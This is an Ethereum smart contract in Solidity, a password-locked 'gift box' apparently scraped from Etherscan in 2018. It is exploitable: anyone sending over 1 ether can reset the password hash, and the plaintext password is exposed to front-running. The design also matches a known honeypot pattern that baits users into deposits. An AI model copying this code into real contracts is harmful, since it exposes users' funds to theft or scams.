//token_name	
//token_url	https://etherscan.io//address/0xB49B1dDdf1b3d6E878FD9b73874Da7Ab0da7E004#code
//spider_time	2018/07/08 12:36:43
//token_Transactions	3 txns
//token_price	

pragma solidity ^0.4.19;

contract ETH_GIFT_BOX
{
    string message;
    
    bool passHasBeenSet = false;
    
    bytes32 public hashPass;
    
    address sender;
	
	function() public payable{}
    
    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
        }
    }
    
    function SetMessage(string _message)
    public
    {
        if(msg.sender==sender)
        {
            message =_message;
        }
    }
    
    function GetGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return message;
        }
    }
    
    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            message="";
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(msg.sender==sender&&hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}